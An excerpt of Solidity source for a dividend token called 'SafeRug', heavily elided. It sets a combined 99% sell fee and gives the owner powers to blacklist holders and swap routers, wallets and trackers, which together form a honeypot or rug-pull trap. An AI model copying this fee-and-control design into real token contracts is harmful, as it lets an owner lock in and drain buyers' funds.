...
Your opinion carries no weight. Invest elsewhere!
 Https://satoshibusinessassociation
...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional, Ownable {
  ...
  address public DividendsToken = address(0xEBE8b57C3B4a3815831C1d3fc5274ee1eD3ECaa0);
...
contract SafeRug is Context, ERC20, Ownable {
    using SafeMath for uint256;
   ...
   SafeRugDividendTracker public dividendTracker;
    ...
    constructor() ERC20 ("SafeRug", "SafeRug") {
        ...
        _sellRewardsFee = 33;
        _sellLiquidityFee = 33;
		_sellMarketingFee = 33;
        _sellDevFee = 0;
    	...
    	dividendTracker = new SafeRugDividendTracker();

    	liquidityWallet = owner();
		
		marketingWallet = payable(0x33Bef312704b8F1f66e719bbdAd5b9A4eA019418);
        _devWallet = payable(0xa6215Da6ED01F0821FF21a74E22f5bCC07e08999);
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        require(newAddress != address(dividendTracker), "SafeRug: The dividend tracker already has that address");

        SafeRugDividendTracker newDividendTracker = SafeRugDividendTracker(payable(newAddress));

        require(newDividendTracker.owner() == address(this), "SafeRug: The new dividend tracker must be owned by the SafeRug token contract");
    ...
    function updateDividendToken(address newAddress) public onlyOwner {
        require(newAddress != address(DividendsToken), "SafeRug: The router already has that address");
    ...
    function updateUniswapV2Router(address newAddress) public onlyOwner {
        require(newAddress != address(uniswapV2Router), "SafeRug: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "SafeRug: Account is already the value of 'excluded'");
    ...
    function addToBlacklist(address account, bool blacklisted) public onlyOwner {
        require(_isBlacklisted[account] != blacklisted, "SafeRug: Account is already the value of 'blacklisted'");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "SafeRug: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "SafeRug: Automated market maker pair is already set to that value");
    ...
    function updateLiquidityWallet(address newLiquidityWallet) public onlyOwner {
        require(newLiquidityWallet != liquidityWallet, "SafeRug: The liquidity wallet is already this address");
    ...
    function updateMarketingWallet(address newMarketingWallet) public onlyOwner {
        require(newMarketingWallet != marketingWallet, "SafeRug: The marketing wallet is already this address");
    ...
    function updateGasForProcessing(uint256 newValue) public onlyOwner {
        require(newValue >= 200000 && newValue <= 500000, "SafeRug: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "SafeRug: Cannot update gasForProcessing to same value");
	...
	function letsGoLive() external onlyOwner() {
        updateBuyFees(7,7,7,0);
        updateSellFees(33,33,33,0);

        updateMaxWallet(100000);
        updateMaxBuySell(100000, 100000);
...
contract SafeRugDividendTracker is Ownable, DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    constructor() DividendPayingToken("SafeRug_Dividend_Tracker", "SafeRug_Dividend_Tracker") {
    	claimWait = 1800;
    ...
    function withdrawDividend() public pure override {
        require(false, "SafeRug_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SafeRug contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 0 && newClaimWait <= 86400, "SafeRug_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "SafeRug_Dividend_Tracker: Cannot update claimWait to same value");
